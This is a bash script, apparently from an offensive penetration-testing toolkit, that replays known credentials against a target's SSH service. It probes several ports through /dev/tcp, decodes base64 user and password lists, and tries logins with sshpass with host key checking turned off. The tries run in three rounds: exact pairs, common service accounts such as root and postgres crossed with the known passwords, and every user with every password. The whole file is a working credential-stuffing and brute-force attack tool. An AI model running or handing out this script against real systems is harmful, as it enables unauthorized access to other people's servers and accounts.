#!/bin/bash
# Replay known credentials against SSH service
# Usage: ssh_replay_pairs.sh <TARGET_IP> <known_users_b64> <known_passwords_b64> <known_cred_pairs_b64>
set -euo pipefail

TARGET_IP="${1:-127.0.0.1}"
KNOWN_USERS_B64="${2:-}"
KNOWN_PASSES_B64="${3:-}"
KNOWN_PAIRS_B64="${4:-}"

echo "=== SSH replay ==="

# Port selection: probe 22 / 2211 / 2222 / 22222 for the open one
PORT=22
for cand in 22 2211 2222 22222; do
    if (exec 3<>/dev/tcp/"$TARGET_IP"/"$cand") 2>/dev/null; then
        PORT=$cand
        exec 3>&- 3<&- 2>/dev/null || true
        break
    fi
done
echo "[INFO] SSH port = $PORT"

# Decode base64 credentials
PAIRS=$(echo "$KNOWN_PAIRS_B64" | base64 -d 2>/dev/null) || PAIRS=""
USERS=$(echo "$KNOWN_USERS_B64" | base64 -d 2>/dev/null) || USERS=""
PASSES=$(echo "$KNOWN_PASSES_B64" | base64 -d 2>/dev/null) || PASSES=""

try_login() {
    local u="$1" p="$2"
    local r
    r=$(sshpass -p "$p" ssh -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o PreferredAuthentications=password \
        -o PubkeyAuthentication=no \
        -o ConnectTimeout=5 -p "$PORT" "$u@$TARGET_IP" \
        "id; uname -a; hostname" 2>&1) || true
    if echo "$r" | grep -q "uid="; then
        echo "SSH_LOGIN_OK:$u:$p"
        echo "$r"
        return 0
    fi
    return 1
}

# Round 1: exact user:password pairs (same-source precise credentials)
while IFS= read -r line; do
    [ -z "$line" ] && continue
    u="${line%%:*}"; p="${line#*:}"
    try_login "$u" "$p" && exit 0
done <<< "$PAIRS"

# Round 2: common ops users x known passwords
for u in root admin ubuntu vagrant www-data mysql postgres oracle; do
    while IFS= read -r p; do
        [ -z "$p" ] && continue
        try_login "$u" "$p" && exit 0
    done <<< "$PASSES"
done

# Round 3: all users x all passwords Cartesian product
while IFS= read -r u; do
    [ -z "$u" ] && continue
    while IFS= read -r p; do
        [ -z "$p" ] && continue
        try_login "$u" "$p" && exit 0
    done <<< "$PASSES"
done <<< "$USERS"

echo "SSH_REPLAY_FAILED"
